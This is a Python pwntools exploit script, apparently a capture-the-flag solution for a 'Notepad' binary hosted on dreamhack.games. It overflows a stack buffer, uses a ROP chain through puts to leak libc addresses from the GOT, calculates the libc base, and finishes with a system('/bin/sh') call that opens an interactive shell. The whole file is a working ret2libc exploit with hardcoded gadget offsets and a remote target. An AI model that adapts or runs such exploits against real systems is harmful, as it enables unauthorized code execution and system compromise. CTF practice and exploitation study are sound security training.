#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./Notepad', checksec=False)

libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so', checksec=False)
#libc6_2.23-0ubuntu11.2_amd64.so
gs = """
set follow-fork-mode parent
b *main
b *main+678
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 20377)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

io = start()

sa(b'-----Enter the content-----\n', b'\'')

puts_got = pack(elf.got['puts'])
puts_plt = pack(elf.plt['puts'])
poprdi_ret = pack(0x0000000000400c73)
ret = pack(0x0000000000400709)
main = pack(elf.sym['main'])
padding = b'a' * 0x1e8 
payload = padding +  poprdi_ret + puts_got + puts_plt + main

sleep(1)

sa(b'-----Leave a message-----\n', payload)
io.recvuntil(b'Bye Bye!!:-)\n')

puts = unpack(io.recvn(6) + b'\x00' * 2)
success(f"puts @ {hex(puts)}")

libc.address = puts - libc.sym['puts']
success(f"libc base @ {hex(libc.address)}")
system = pack(libc.symbols['system'])
binsh = pack(next(libc.search(b'/bin/sh\x00')))

read_got = pack(elf.got['read'])
sa(b'-----Enter the content-----\n', b'\'')
sleep(1)
payload = padding +  poprdi_ret + read_got + puts_plt + main
sa(b'-----Leave a message-----\n', payload)
io.recvuntil(b'Bye Bye!!:-)\n')

read = unpack(io.recvn(6) + b'\x00' * 2)
success(f"read @ {hex(read)}")



sa(b'-----Enter the content-----\n', b'\'')

sleep(1)
payload = padding + ret + poprdi_ret + binsh + system
sa(b'-----Leave a message-----\n', payload)

io.interactive()